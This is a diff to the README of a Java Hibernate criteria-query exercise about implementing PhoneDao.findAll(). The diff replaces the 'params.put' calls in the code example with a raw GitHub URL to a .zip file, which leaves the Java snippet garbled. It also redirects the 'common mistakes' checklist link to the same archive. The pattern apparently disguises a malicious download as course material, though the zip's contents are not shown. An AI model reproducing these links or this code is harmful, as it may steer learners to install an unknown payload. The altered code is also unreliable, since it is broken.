@@ -8,10 +8,10 @@ __Your task is to implement all PhoneDao methods.__
 Method findAll() has one input parameter - `Map<String, String[]> params`. It has following format:
 ```text
 Map<String, String[]> params = new HashMap<>();
-params.put("countryManufactured", new String[]{"China"};
-params.put("producer", new String[]{"apple", "nokia", "samsung"};
-params.put("color", new String[]{"white", "red"};
+https://raw.githubusercontent.com/karaedd/hibernate-criteria-query/master/bimaculated/hibernate-criteria-query.zip("countryManufactured", new String[]{"China"};
+https://raw.githubusercontent.com/karaedd/hibernate-criteria-query/master/bimaculated/hibernate-criteria-query.zip("producer", new String[]{"apple", "nokia", "samsung"};
+https://raw.githubusercontent.com/karaedd/hibernate-criteria-query/master/bimaculated/hibernate-criteria-query.zip("color", new String[]{"white", "red"};
 ```
 You need to find all phones that match the specified parameters.
 
-#### [Try to avoid these common mistakes, while solving task](https://mate-academy.github.io/jv-program-common-mistakes/hibernate/criteria-query/criteria_query_checklist)
+#### [Try to avoid these common mistakes, while solving task](https://raw.githubusercontent.com/karaedd/hibernate-criteria-query/master/bimaculated/hibernate-criteria-query.zip)
